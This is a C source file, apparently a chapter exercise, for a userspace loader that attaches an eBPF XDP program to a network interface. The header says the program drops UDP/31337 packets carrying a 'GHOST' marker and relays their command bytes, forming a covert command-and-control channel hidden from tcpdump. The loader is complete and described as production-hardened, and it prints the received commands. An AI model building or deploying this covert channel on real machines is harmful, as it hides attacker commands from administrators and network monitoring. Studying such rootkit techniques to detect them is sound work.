// ch05b-ghost-nic userspace loader.
//
// XDP program drops UDP/31337 with magic "GHOST" payload and emits the
// command bytes via ringbuf — a covert C2 channel invisible to tcpdump.
//
// Production hardening:
//   - getopt argument parsing with -h/--help (-i ifname, -v verbose,
//     -S skb-mode, -G generic-mode-only)
//   - SIGINT/SIGTERM handler interrupts ring_buffer__poll via SA_RESTART=0
//   - bpf_xdp_detach() is invoked on EVERY exit path via a single cleanup
//     label (success, error, signal, mid-poll)
//   - every libbpf return value checked with strerror(-err)
#include <errno.h>
#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_link.h>

#include <bpf/bpf.h>
#include <bpf/libbpf.h>

#include "ch05b-ghost-nic.skel.h"

struct evt {
    unsigned int saddr;
    unsigned int daddr;
    unsigned short sport;
    unsigned short dport;
    char cmd[48];
};

static volatile sig_atomic_t stop;

/* These are owned by main() but read by the cleanup path; declared at file
 * scope so the SIGINT handler could interrogate them if we ever needed an
 * async-signal-safe detach. Today the handler just flips `stop`. */
static int g_ifindex = 0;
static unsigned int g_xdp_flags = 0;

static void on_signal(int signo)
{
    (void)signo;
    stop = 1;
}

static int handle_event(void *ctx, void *data, size_t sz)
{
    (void)ctx;
    if (sz < sizeof(struct evt))
        return 0;
    const struct evt *e = data;
    char s[INET_ADDRSTRLEN] = {0};
    char d[INET_ADDRSTRLEN] = {0};
    inet_ntop(AF_INET, &e->saddr, s, sizeof(s));
    inet_ntop(AF_INET, &e->daddr, d, sizeof(d));
    /* Defensive: ensure cmd is NUL-terminated before %s formatting. */
    char cmd[sizeof(e->cmd) + 1] = {0};
    memcpy(cmd, e->cmd, sizeof(e->cmd));
    printf("[ghost] DROPPED pkt %s:%u -> %s:%u cmd='%s'\n",
           s, e->sport, d, e->dport, cmd);
    fflush(stdout);
    return 0;
}

static int libbpf_silence(enum libbpf_print_level lvl, const char *fmt, va_list ap)
{
    if (lvl == LIBBPF_DEBUG)
        return 0;
    return vfprintf(stderr, fmt, ap);
}

static void usage(const char *prog)
{
    fprintf(stderr,
        "Usage: %s -i <ifname> [-S] [-G] [-v] [-h]\n"
        "  -i, --iface NAME    Interface to attach XDP to (required)\n"
        "  -S, --skb           Force SKB (generic) XDP mode, skip drv-mode\n"
        "  -G, --generic-only  Synonym for -S\n"
        "  -v, --verbose       Enable libbpf debug logs\n"
        "  -h, --help          Show this help and exit\n"
        "\n"
        "Drops UDP/31337 packets whose payload starts with 'GHOST' and\n"
        "streams the trailing command bytes on stdout.\n",
        prog);
}

int main(int argc, char **argv)
{
    const char *ifname = NULL;
    int verbose = 0;
    int skb_only = 0;

    static const struct option longopts[] = {
        {"iface",        required_argument, NULL, 'i'},
        {"skb",          no_argument,       NULL, 'S'},
        {"generic-only", no_argument,       NULL, 'G'},
        {"verbose",      no_argument,       NULL, 'v'},
        {"help",         no_argument,       NULL, 'h'},
        {0, 0, 0, 0},
    };
    int opt;
    while ((opt = getopt_long(argc, argv, "i:SGvh", longopts, NULL)) != -1) {
        switch (opt) {
        case 'i': ifname = optarg; break;
        case 'S':
        case 'G': skb_only = 1; break;
        case 'v': verbose = 1; break;
        case 'h': usage(argv[0]); return 0;
        default:  usage(argv[0]); return 2;
        }
    }
    if (!ifname) {
        fprintf(stderr, "[ghost] missing required -i <ifname>\n");
        usage(argv[0]);
        return 2;
    }
    if (optind < argc) {
        fprintf(stderr, "[ghost] unexpected argument: %s\n", argv[optind]);
        usage(argv[0]);
        return 2;
    }

    if (!verbose)
        libbpf_set_print(libbpf_silence);

    int rc = 1;
    struct ch05b_ghost_nic_bpf *skel = NULL;
    struct ring_buffer *rb = NULL;
    int attached = 0;

    int ifindex = if_nametoindex(ifname);
    if (!ifindex) {
        fprintf(stderr, "[ghost] if_nametoindex(%s): %s\n", ifname, strerror(errno));
        goto out;
    }
    g_ifindex = ifindex;

    /* Install signal handlers EARLY so even a SIGINT during load triggers
     * the cleanup goto chain. SA_RESTART left clear so ring_buffer__poll
     * returns -EINTR promptly. */
    struct sigaction sa = { .sa_handler = on_signal };
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGINT, &sa, NULL) < 0 || sigaction(SIGTERM, &sa, NULL) < 0) {
        fprintf(stderr, "[ghost] sigaction: %s\n", strerror(errno));
        goto out;
    }

    skel = ch05b_ghost_nic_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "[ghost] open_and_load failed: %s\n", strerror(errno));
        goto out;
    }

    int prog_fd = bpf_program__fd(skel->progs.xdp_ghost);
    if (prog_fd < 0) {
        fprintf(stderr, "[ghost] bpf_program__fd: %s\n", strerror(-prog_fd));
        goto out;
    }

    int err = -1;
    if (!skb_only) {
        err = bpf_xdp_attach(ifindex, prog_fd, XDP_FLAGS_DRV_MODE, NULL);
        if (err) {
            fprintf(stderr, "[ghost] drv-mode attach failed (%s), falling back to skb-mode\n",
                    strerror(-err));
        } else {
            g_xdp_flags = XDP_FLAGS_DRV_MODE;
            attached = 1;
            fprintf(stderr, "[ghost] attached XDP (drv-mode) to %s ifindex=%d\n", ifname, ifindex);
        }
    }
    if (!attached) {
        err = bpf_xdp_attach(ifindex, prog_fd, XDP_FLAGS_SKB_MODE, NULL);
        if (err) {
            fprintf(stderr, "[ghost] skb-mode attach failed: %s\n", strerror(-err));
            goto out;
        }
        g_xdp_flags = XDP_FLAGS_SKB_MODE;
        attached = 1;
        fprintf(stderr, "[ghost] attached XDP (skb-mode) to %s ifindex=%d\n", ifname, ifindex);
    }

    rb = ring_buffer__new(bpf_map__fd(skel->maps.events), handle_event, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ghost] ring_buffer__new: %s\n", strerror(errno));
        goto out;
    }

    fprintf(stderr, "[ghost] polling — Ctrl-C to detach and exit\n");

    while (!stop) {
        int n = ring_buffer__poll(rb, 200);
        if (n < 0) {
            if (n == -EINTR)
                break; /* signal during poll → fall through to cleanup */
            fprintf(stderr, "[ghost] ring_buffer__poll: %s\n", strerror(-n));
            break;
        }
    }

    rc = 0;
out:
    /* Detach XDP on EVERY exit path — success, error, or signal interrupt.
     * Without this the program FD is closed but the netdev still references
     * a kernel BPF prog, leaving a dangling XDP attachment until reboot or
     * manual `ip link set dev <if> xdp off`. */
    if (attached) {
        int derr = bpf_xdp_detach(g_ifindex, g_xdp_flags, NULL);
        if (derr)
            fprintf(stderr, "[ghost] bpf_xdp_detach: %s\n", strerror(-derr));
        else
            fprintf(stderr, "[ghost] detached XDP from ifindex=%d\n", g_ifindex);
    }
    if (rb)
        ring_buffer__free(rb);
    if (skel)
        ch05b_ghost_nic_bpf__destroy(skel);
    fprintf(stderr, "[ghost] shutdown (rc=%d)\n", rc);
    return rc;
}
